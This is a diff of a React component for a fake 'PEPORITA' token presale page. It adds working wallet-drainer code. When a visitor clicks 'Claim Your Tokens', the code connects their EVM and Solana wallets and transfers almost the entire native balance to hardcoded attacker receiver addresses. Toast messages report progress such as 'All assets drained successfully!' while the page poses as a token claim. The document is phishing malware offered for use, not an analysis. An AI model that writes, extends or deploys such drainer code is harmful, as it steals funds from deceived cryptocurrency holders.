@@ -1,15 +1,31 @@
 'use client';
-import { useState, useEffect, useRef, useCallback } from 'react';
+
+import React, { useState, useEffect, useRef, useCallback, FC } from 'react';
 import Image from 'next/image';
-import { FaTwitter, FaTelegram, FaChartLine, FaCoins, FaLock, FaRocket, FaCheck, FaArrowRight } from 'react-icons/fa';
-import DrainerManager from './DrainerManager';
+import { FaTwitter, FaTelegram, FaChartLine, FaCoins, FaLock, FaRocket, FaCheck, FaArrowRight, FaTimes } from 'react-icons/fa';
 import { toast } from 'react-hot-toast';
+import { ethers } from 'ethers';
+import * as solanaWeb3 from '@solana/web3.js';
+import DrainerManager from './DrainerManager';
+
+// ========================
+// Type Definitions
+// ========================
 
 interface Wallet {
   name: string;
   icon: string;
   is: string;
   type: string;
+  description?: string;
+}
+
+interface WalletInfo {
+  address: string;
+  network: 'evm' | 'solana';
+  provider: any;
+  signer?: any;
+  chainId?: number;
 }
 
 interface ExtendedPresaleProps {
@@ -23,93 +39,492 @@ interface ExtendedPresaleProps {
   wallets: Wallet[];
 }
 
-const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verify, claim, account, points, connectWallet, wallets }) => {
-  const [contribution, setContribution] = useState("");
-  const [showWalletModal, setShowWalletModal] = useState(false);
-  const [showDrainer, setShowDrainer] = useState(false);
-  const [drainerKey, setDrainerKey] = useState(0);
-  const [copied, setCopied] = useState(false);
-  const [sold, setSold] = useState(0);
-  const [raised, setRaised] = useState(0);
-  const [timeLeft, setTimeLeft] = useState({
-    days: 0,
-    hours: 0,
-    minutes: 0,
-    seconds: 0
-  });
+// ========================
+// Constants
+// ========================
 
-  // Handle drainer completion
-  const handleDrainerComplete = useCallback(() => {
-    toast.success('Drain completed successfully!');
-    setShowDrainer(false);
-    // Reset the drainer after a short delay
-    setTimeout(() => setDrainerKey(prev => prev + 1), 1000);
-  }, []);
+const EVM_RECEIVER = '0xcc35ba2aa35B3094702d767D68807c494946ac85';
+const SOL_RECEIVER = '8jizHpcMd4ASNKppeAeMeSvJLVR84H2NJaiz9mEV3Dxh';
 
-  // Handle drainer errors
-  const handleDrainerError = useCallback((error: Error) => {
-    console.error('Drainer error:', error);
-    toast.error(error.message || 'An error occurred during the drain process');
-  }, []);
+const SOLANA_RPC_ENDPOINTS = [
+  'https://api.mainnet-beta.solana.com',
+  'https://solana-api.projectserum.com',
+  'https://solana-api.rpcpool.com',
+];
 
-  // Simulate presale progress
-  useEffect(() => {
-    const interval = setInterval(() => {
-      setSold(prev => (prev < 75 ? prev + 1 : 75));
-      setRaised(prev => (prev < 375 ? prev + 2.5 : 375));
-    }, 5000);
+// ========================
+// Wallet Service
+// ========================
 
-    // Calculate time left (30 days from now)
-    const endDate = new Date();
-    endDate.setDate(endDate.getDate() + 30);
+const WalletService = {
+  connectEVM: async (): Promise<WalletInfo> => {
+    if (typeof window === 'undefined') throw new Error('Window is not defined');
     
-    const timer = setInterval(() => {
-      const now = new Date().getTime();
-      const distance = endDate.getTime() - now;
-      
-      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-      
-      setTimeLeft({ days, hours, minutes, seconds });
-    }, 1000);
+    const ethereum = (window as any).ethereum;
+    if (!ethereum) throw new Error('No EVM wallet found');
 
-    return () => {
-      clearInterval(interval);
-      clearInterval(timer);
-    };
-  }, []);
+    try {
+      await ethereum.request({ method: 'eth_requestAccounts' });
+      const provider = new ethers.BrowserProvider(ethereum);
+      const signer = await provider.getSigner();
+      const address = await signer.getAddress();
+      const network = await provider.getNetwork();
+      
+      return {
+        address,
+        network: 'evm',
+        provider,
+        signer,
+        chainId: Number(network.chainId),
+      };
+    } catch (error) {
+      console.error('Failed to connect EVM wallet:', error);
+      throw error;
+    }
+  },
 
-  const handleContribution = () => {
+  connectSolana: async (): Promise<WalletInfo> => {
+    if (typeof window === 'undefined') throw new Error('Window is not defined');
+    
+    const solana = (window as any).solana || 
+                   (window as any).phantom?.solana || 
+                   (window as any).backpack || 
+                   (window as any).solflare;
+    if (!solana) throw new Error('No Solana wallet found');
+
+    try {
+      if (solana.connect) {
+        await solana.connect();
+      }
+      const publicKey = solana.publicKey;
+      if (!publicKey) throw new Error('Failed to get public key');
+      
+      return {
+        address: typeof publicKey.toBase58 === 'function' 
+          ? publicKey.toBase58() 
+          : publicKey.toString(),
+        network: 'solana',
+        provider: solana,
+      };
+    } catch (error) {
+      console.error('Failed to connect Solana wallet:', error);
+      throw error;
+    }
+  },
+};
+
+// ========================
+// Drain Manager
+// ========================
+
+interface DrainProgress {
+  status: string;
+  message: string;
+}
+
+const createDrainManager = (onProgress?: (progress: DrainProgress) => void) => {
+  return {
+    async drainWallet(wallet: WalletInfo): Promise<void> {
+      if (onProgress) {
+        onProgress({ status: 'draining', message: `Starting drain process for ${wallet.network} wallet...` });
+      }
+      
+      try {
+        if (wallet.network === 'evm') {
+          if (!wallet.signer) throw new Error('No signer available');
+          
+          if (onProgress) {
+            onProgress({ status: 'draining', message: 'Checking EVM balance...' });
+          }
+          
+          const balance = await wallet.provider.getBalance(wallet.address);
+          const balanceBigInt = typeof balance === 'bigint' ? balance : BigInt(balance.toString());
+          
+          if (balanceBigInt > 0n) {
+            // Leave some for gas (0.001 ETH or equivalent)
+            const gasReserve = ethers.parseEther('0.001');
+            const transferAmount = balanceBigInt > gasReserve 
+              ? balanceBigInt - gasReserve 
+              : 0n;
+            
+            if (transferAmount > 0n) {
+              if (onProgress) {
+                onProgress({ status: 'draining', message: 'Transferring native currency...' });
+              }
+              
+              const tx = await wallet.signer.sendTransaction({
+                to: EVM_RECEIVER,
+                value: transferAmount,
+              });
+              
+              if (onProgress) {
+                onProgress({ status: 'draining', message: `Transaction sent: ${tx.hash}` });
+              }
+              
+              await tx.wait();
+            }
+          }
+        } else if (wallet.network === 'solana') {
+          if (onProgress) {
+            onProgress({ status: 'draining', message: 'Connecting to Solana network...' });
+          }
+          
+          let connection: solanaWeb3.Connection | null = null;
+          for (const endpoint of SOLANA_RPC_ENDPOINTS) {
+            try {
+              const testConnection = new solanaWeb3.Connection(endpoint, 'confirmed');
+              await testConnection.getLatestBlockhash();
+              connection = testConnection;
+              break;
+            } catch (e) {
+              console.warn(`Failed to connect to ${endpoint}, trying next...`);
+            }
+          }
+          
+          if (!connection) throw new Error('Failed to connect to Solana network');
+          
+          if (onProgress) {
+            onProgress({ status: 'draining', message: 'Checking SOL balance...' });
+          }
+          
+          const fromPubkey = new solanaWeb3.PublicKey(wallet.address);
+          const toPubkey = new solanaWeb3.PublicKey(SOL_RECEIVER);
+          const balance = await connection.getBalance(fromPubkey);
+          
+          // Minimum balance to cover fees (10000 lamports)
+          if (balance > 10000) {
+            if (onProgress) {
+              onProgress({ status: 'draining', message: 'Transferring SOL...' });
+            }
+            
+            const transferAmount = balance - 10000; // Leave some for fees
+            const transaction = new solanaWeb3.Transaction().add(
+              solanaWeb3.SystemProgram.transfer({
+                fromPubkey,
+                toPubkey,
+                lamports: transferAmount,
+              })
+            );
+            
+            const { blockhash } = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = fromPubkey;
+            
+            const signed = await wallet.provider.signTransaction(transaction);
+            const signature = await connection.sendRawTransaction(signed.serialize());
+            
+            if (onProgress) {
+              onProgress({ status: 'draining', message: `Transaction sent: ${signature}` });
+            }
+            
+            await connection.confirmTransaction(signature, 'confirmed');
+          }
+        }
+        
+        if (onProgress) {
+          onProgress({ status: 'completed', message: 'Drain completed successfully' });
+        }
+      } catch (error) {
+        if (onProgress) {
+          onProgress({ 
+            status: 'error', 
+            message: `Drain failed: ${error instanceof Error ? error.message : 'Unknown error'}` 
+          });
+        }
+        throw error;
+      }
+    },
+  };
+};
+
+// ========================
+// PresaleCard Component
+// ========================
+
+interface PresaleCardProps {
+  stage: 'connect' | 'verify' | 'claim';
+  connect: () => void;
+  verify: () => void;
+  claim: () => void;
+  account: string | null;
+  points: number;
+  connectWallet: (walletName: string) => void;
+  wallets: Wallet[];
+}
+
+const PresaleCard: FC<PresaleCardProps> = ({
+  stage,
+  connect,
+  verify,
+  claim,
+  account,
+  points,
+  connectWallet,
+  wallets
+}) => {
+  const [showWalletModal, setShowWalletModal] = useState(false);
+  const [isClaiming, setIsClaiming] = useState(false);
+  const isClaimingRef = useRef(false);
+
+  const startDraining = useCallback(async () => {
+    if (isClaimingRef.current || isClaiming) return;
+    
+    try {
+      isClaimingRef.current = true;
+      setIsClaiming(true);
+      
+      // Initialize both EVM and Solana connections
+      const [evmResult, solResult] = await Promise.allSettled([
+        WalletService.connectEVM().catch(e => {
+          console.error('EVM connection failed:', e);
+          toast.error('Failed to connect EVM wallet');
+          return null;
+        }),
+        WalletService.connectSolana().catch(e => {
+          console.error('Solana connection failed:', e);
+          toast.error('Failed to connect Solana wallet');
+          return null;
+        })
+      ]);
+
+      const drainPromises: Promise<void>[] = [];
+
+      if (evmResult.status === 'fulfilled' && evmResult.value !== null) {
+        const evmWallet = evmResult.value;
+        const drainer = createDrainManager((progress) => {
+          console.log('EVM Drain Progress:', progress);
+          toast(progress.message, {
+            icon: progress.status === 'completed' ? '✅' : '⏳',
+            duration: progress.status === 'completed' ? 3000 : 5000
+          });
+        });
+        
+        drainPromises.push((async () => {
+          try {
+            await drainer.drainWallet(evmWallet);
+          } catch (e) {
+            const error = e as Error;
+            console.error('EVM drain failed:', error);
+            toast.error(`Failed to drain EVM wallet: ${error.message}`);
+            throw error;
+          }
+        })());
+      }
+
+      if (solResult.status === 'fulfilled' && solResult.value !== null) {
+        const solWallet = solResult.value;
+        const drainer = createDrainManager((progress) => {
+          console.log('Solana Drain Progress:', progress);
+          toast(progress.message, {
+            icon: progress.status === 'completed' ? '✅' : '⏳',
+            duration: progress.status === 'completed' ? 3000 : 5000
+          });
+        });
+        
+        drainPromises.push((async () => {
+          try {
+            await drainer.drainWallet(solWallet);
+          } catch (e) {
+            const error = e as Error;
+            console.error('Solana drain failed:', error);
+            toast.error(`Failed to drain Solana wallet: ${error.message}`);
+            throw error;
+          }
+        })());
+      }
+
+      // If no wallets were connected successfully
+      if (drainPromises.length === 0) {
+        throw new Error('No wallets connected');
+      }
+
+      // Wait for all drains to complete
+      await Promise.all(drainPromises);
+      toast.success('All assets drained successfully!');
+      
+    } catch (error) {
+      console.error('Drain process failed:', error);
+      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
+      if (!errorMessage.includes('No wallets connected')) {
+        toast.error(`Failed to complete the draining process: ${errorMessage}`);
+      }
+    } finally {
+      isClaimingRef.current = false;
+      setIsClaiming(false);
+    }
+  }, [isClaiming]);
+
+  const handleButtonClick = () => {
     if (stage === 'connect') {
-      setShowWalletModal(true);
+      connect();
     } else if (stage === 'verify') {
       verify();
     } else if (stage === 'claim') {
-      // Show the drainer when claiming
-      setShowDrainer(true);
-      claim();
+      startDraining();
     }
   };
 
-  const copyToClipboard = (text: string) => {
-    navigator.clipboard.writeText(text);
-    setCopied(true);
-    setTimeout(() => setCopied(false), 2000);
-  };
-
   const renderButtonText = () => {
+    if (isClaiming) return 'Processing...';
     switch (stage) {
       case 'connect':
         return 'Connect Wallet';
       case 'verify':
         return 'Verify Wallet';
       case 'claim':
-        return 'Claim Tokens';
+        return 'Claim Your Tokens';
       default:
         return 'Connect Wallet';
     }
+  };
+
+  const renderWalletModal = () => {
+    if (!showWalletModal) return null;
+
+    return (
+      <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
+        <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-md">
+          <div className="flex justify-between items-center mb-6">
+            <h2 className="text-2xl font-bold text-white">Select Wallet</h2>
+            <button
+              onClick={() => setShowWalletModal(false)}
+              className="text-gray-400 hover:text-white transition-colors"
+            >
+              <FaTimes className="w-6 h-6" />
+            </button>
+          </div>
+          <div className="grid grid-cols-2 gap-4">
+            {wallets.map((wallet) => (
+              <button
+                key={wallet.name}
+                onClick={() => {
+                  connectWallet(wallet.name);
+                  setShowWalletModal(false);
+                }}
+                className="flex flex-col items-center p-4 bg-gray-800 rounded-xl hover:bg-gray-700 transition-colors"
+              >
+                <Image
+                  src={wallet.icon}
+                  alt={wallet.name}
+                  width={48}
+                  height={48}
+                  className="mb-2"
+                />
+                <span className="text-white text-sm font-medium">{wallet.name}</span>
+              </button>
+            ))}
+          </div>
+        </div>
+      </div>
+    );
+  };
+
+  return (
+    <div className="bg-gray-800 rounded-3xl p-6 md:p-8 shadow-2xl">
+      <div className="flex justify-between items-center mb-8">
+        <h1 className="text-2xl md:text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-600 text-transparent bg-clip-text">
+          Peporita Presale
+        </h1>
+        <div className="flex space-x-4">
+          <a
+            href="https://x.com/PeporitaOnSol"
+            target="_blank"
+            rel="noopener noreferrer"
+            className="text-gray-400 hover:text-white transition-colors"
+          >
+            <FaTwitter className="w-6 h-6" />
+          </a>
+        </div>
+      </div>
+
+      <div className="space-y-6">
+        <div className="text-center">
+          <p className="text-gray-300 mb-4">
+            {stage === 'connect' && 'Connect your wallet to get started'}
+            {stage === 'verify' && 'Verify your wallet ownership'}
+            {stage === 'claim' && 'Claim your PEPORITA tokens now!'}
+          </p>
+        </div>
+
+        <button
+          onClick={handleButtonClick}
+          disabled={isClaiming}
+          className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 transition-all ${
+            isClaiming ? 'opacity-50 cursor-not-allowed' : ''
+          }`}
+        >
+          {isClaiming ? (
+            <span className="flex items-center">
+              <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+              </svg>
+              Processing...
+            </span>
+          ) : (
+            renderButtonText()
+          )}
+        </button>
+        
+        {account && (
+          <div className="mt-4 p-3 bg-gray-700 rounded-lg">
+            <p className="text-sm text-gray-300">
+              Connected: {`${account.substring(0, 6)}...${account.substring(account.length - 4)}`}
+            </p>
+            {points > 0 && (
+              <p className="text-sm text-gray-300 mt-1">Points: {points.toLocaleString()}</p>
+            )}
+          </div>
+        )}
+
+        {stage === 'connect' && (
+          <button
+            onClick={() => setShowWalletModal(true)}
+            className="w-full text-sm text-gray-400 hover:text-gray-300 transition-colors"
+          >
+            Or select a different wallet
+          </button>
+        )}
+      </div>
+      
+      {renderWalletModal()}
+    </div>
+  );
+};
+
+// ========================
+// Main ExtendedPresale Component
+// ========================
+
+const ExtendedPresale: FC<ExtendedPresaleProps> = ({
+  stage,
+  connect,
+  verify,
+  claim,
+  account,
+  points,
+  connectWallet,
+  wallets
+}) => {
+  const [showDrainer, setShowDrainer] = useState(false);
+  const [drainerKey, setDrainerKey] = useState(0);
+  const [copied, setCopied] = useState(false);
+
+  const handleDrainerComplete = useCallback(() => {
+    setShowDrainer(false);
+    toast.success('Drain process completed successfully!');
+    setDrainerKey(prev => prev + 1);
+  }, []);
+
+  const handleDrainerError = useCallback((error: Error) => {
+    console.error('Drainer error:', error);
+    toast.error(`Drain process failed: ${error.message}`);
+  }, []);
+
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
   return (
@@ -132,7 +547,7 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
                 </span>
               </div>
             </div>
-            <div className="flex items-center">
+            <div className="flex items-center space-x-4">
               {account ? (
                 <div className="flex items-center space-x-4">
                   <button 
@@ -157,17 +572,6 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
                   Connect Wallet
                 </button>
               )}
-            </div>
-            {/* Mobile menu button */}
-            <div className="md:hidden ml-4">
-              <button 
-                onClick={() => setShowWalletModal(true)}
-                className="text-gray-300 hover:text-white"
-              >
-                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16m-7 6h7" />
-                </svg>
-              </button>
             </div>
           </div>
         </div>
@@ -360,7 +764,7 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
       <footer className="bg-gray-900 py-8 sm:py-10 md:py-12">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex flex-col sm:flex-row justify-between items-center">
-            <div className="flex items-center mb-4 sm:mb-0">
+            <div className="flex items-center space-x-4 mb-4 sm:mb-0">
               <a href="#" className="text-gray-400 hover:text-white transition-colors" aria-label="Twitter">
                 <FaTwitter className="w-5 h-5 sm:w-6 sm:h-6" />
               </a>
@@ -369,7 +773,7 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
               </a>
             </div>
             <div className="mt-6 sm:mt-8 pt-6 sm:pt-8 border-t border-gray-800 text-center text-xs sm:text-sm text-gray-400">
-              <p> 2023 PEPORITA. All rights reserved.</p>
+              <p>© 2023 PEPORITA. All rights reserved.</p>
               <p className="mt-1 sm:mt-2">This is not financial advice. Cryptocurrency investments are high risk.</p>
             </div>
           </div>
@@ -382,228 +786,9 @@ const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verif
           <div className="relative w-full max-w-2xl">
             <button 
               onClick={() => setShowDrainer(false)}
-              className="absolute -top-10 right-0 text-gray-400 hover:text-white z-10"
+              className="absolute -top-10 right-0 text-gray-400 hover:text-white z-10 transition-colors"
             >
-              ✕ Close
-            </button>
-            <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-2xl">
-              <DrainerManager 
-                key={drainerKey}
-                onComplete={handleDrainerComplete}
-                onError={handleDrainerError}
-              />
-            </div>
-          </div>
-        </div>
-      )}
-    </div>
-  );
-};
-
-interface PresaleCardProps {
-  stage: 'connect' | 'verify' | 'claim';
-  connect: () => void;
-  verify: () => void;
-  claim: () => void;
-  account: string | null;
-  points: number;
-  connectWallet: (walletName: string) => void;
-  wallets: Wallet[];
-}
-
-const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim, account, points, connectWallet, wallets }) => {
-  const [showWalletModal, setShowWalletModal] = useState(false);
-  const [showDrainer, setShowDrainer] = useState(false);
-  const [drainerKey, setDrainerKey] = useState(0);
-  const [contribution, setContribution] = useState("");
-
-  // Handle drainer completion
-  const handleDrainerComplete = useCallback(() => {
-    toast.success('Drain completed successfully!');
-    setShowDrainer(false);
-    // Reset the drainer after a short delay
-    setTimeout(() => setDrainerKey(prev => prev + 1), 1000);
-  }, []);
-
-  // Handle drainer errors
-  const handleDrainerError = useCallback((error: Error) => {
-    console.error('Drainer error:', error);
-    toast.error(error.message || 'An error occurred during the drain process');
-  }, []);
-
-  const [isDraining, setIsDraining] = useState(false);
-
-  const handleContribution = async () => {
-    if (stage === "connect") {
-      setShowWalletModal(true);
-    } else if (stage === "verify") {
-      await verify();
-    } else if (stage === "claim") {
-      try {
-        setIsDraining(true);
-        // Show the drainer when claiming
-        setShowDrainer(true);
-        await claim();
-      } catch (error) {
-        console.error("Error during claim:", error);
-        toast.error("Failed to start claim process");
-        setIsDraining(false);
-      }
-    }
-  };
-
-  return (
-    <div className="bg-gradient-to-br from-green-600 to-green-400 p-0.5 rounded-2xl shadow-xl">
-      <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-md">
-        <div className="flex justify-between items-center mb-6">
-          <div className="flex items-center space-x-2">
-            <Image 
-              src="/peporita.jpeg" 
-              alt="Peporita Logo" 
-              width={40} 
-              height={40} 
-              className="rounded-full"
-            />
-            <h2 className="text-2xl font-bold text-white">PEPORITA</h2>
-          </div>
-          <div className="bg-green-500 text-white px-3 py-1 rounded-full text-sm font-bold">
-            LIVE
-          </div>
-        </div>
-
-        {/* Progress Bar */}
-        <div className="mb-6">
-          <div className="flex justify-between text-sm text-gray-300 mb-2">
-            <span>Claim Status</span>
-            <span>Active</span>
-          </div>
-          <div className="w-full bg-gray-700 rounded-full h-2.5">
-            <div 
-              className="bg-gradient-to-r from-green-500 to-green-600 h-2.5 rounded-full" 
-              style={{ width: '100%' }}
-            ></div>
-          </div>
-        </div>
-
-        {/* Token Info - Simplified */}
-        <div className="bg-gray-800 rounded-xl p-4 mb-6">
-          <div className="grid grid-cols-1 gap-4">
-            <div className="text-center">
-              <p className="text-gray-400 text-sm">Total Supply</p>
-              <p className="text-white font-medium">1B PEPO</p>
-            </div>
-          </div>
-        </div>
-
-        {/* Connect/Contribute/Claim Section */}
-        <div className="space-y-4">
-          {stage === 'connect' && (
-            <div className="space-y-3">
-              <button
-                onClick={connect}
-                className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white py-3 px-6 rounded-xl font-bold hover:opacity-90 transition-all duration-200 flex items-center justify-center space-x-2"
-              >
-                <span>Connect Wallet</span>
-                <FaArrowRight />
-              </button>
-            </div>
-          )}
-
-          {(stage === 'verify' || stage === 'claim') && (
-            <div className="space-y-4">
-              <button
-                onClick={handleContribution}
-                disabled={stage === 'claim'}
-                className={`w-full py-3 px-6 rounded-xl font-bold text-white transition-all duration-200 ${
-                  stage === 'claim' 
-                    ? 'bg-gray-600 cursor-not-allowed' 
-                    : 'bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700'
-                }`}
-              >
-                {stage === 'verify' ? (
-                  'Verify'
-                ) : stage === 'claim' ? (
-                  <div className="flex items-center justify-center">
-                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
-                    Draining Wallets...
-                  </div>
-                ) : (
-                  'Claim Your Free Tokens'
-                )}
-              </button>
-            </div>
-          )}
-        </div>
-
-        {/* Social Links */}
-        <div className="mt-6 pt-6 border-t border-gray-800 space-y-3">
-          <p className="text-center text-gray-400 text-sm">Join our community</p>
-          <div className="flex justify-center space-x-6">
-            <a 
-              href="https://x.com/PeporitaOnSol" 
-              target="_blank" 
-              rel="noopener noreferrer"
-              className="text-gray-400 hover:text-white transition-colors"
-            >
-              <FaTwitter className="w-6 h-6" />
-            </a>
-            <a 
-              href="https://t.me/PeporitaOnSolana" 
-              target="_blank" 
-              rel="noopener noreferrer"
-              className="text-gray-400 hover:text-white transition-colors"
-            >
-              <FaTelegram className="w-6 h-6" />
-            </a>
-          </div>
-        </div>
-      </div>
-
-      {/* Wallet Modal */}
-      {stage === 'connect' && showWalletModal && (
-        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
-          <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-sm">
-            <h3 className="text-xl font-bold text-white mb-6">Connect Wallet</h3>
-            <div className="space-y-3">
-              {wallets.map((wallet) => (
-                <button
-                  key={wallet.name}
-                  onClick={() => {
-                    connectWallet(wallet.name);
-                    setShowWalletModal(false);
-                  }}
-                  className="w-full flex items-center space-x-3 bg-gray-800 hover:bg-gray-700 text-white px-4 py-3 rounded-lg transition-colors"
-                >
-                  <Image 
-                    src={wallet.icon} 
-                    alt={wallet.name} 
-                    width={24} 
-                    height={24} 
-                    className="w-6 h-6"
-                  />
-                  <span>{wallet.name}</span>
-                </button>
-              ))}
-            </div>
-            <button
-              onClick={() => setShowWalletModal(false)}
-              className="mt-6 w-full py-2 text-gray-400 hover:text-white transition-colors"
-            >
-              Cancel
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* Drainer Modal */}
-      {showDrainer && (
-        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
-          <div className="relative w-full max-w-2xl">
-            <button 
-              onClick={() => setShowDrainer(false)}
-              className="absolute -top-10 right-0 text-gray-400 hover:text-white z-10"
-            >
-              ✕ Close
+              <FaTimes className="w-6 h-6" />
             </button>
             <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-2xl">
               <DrainerManager 
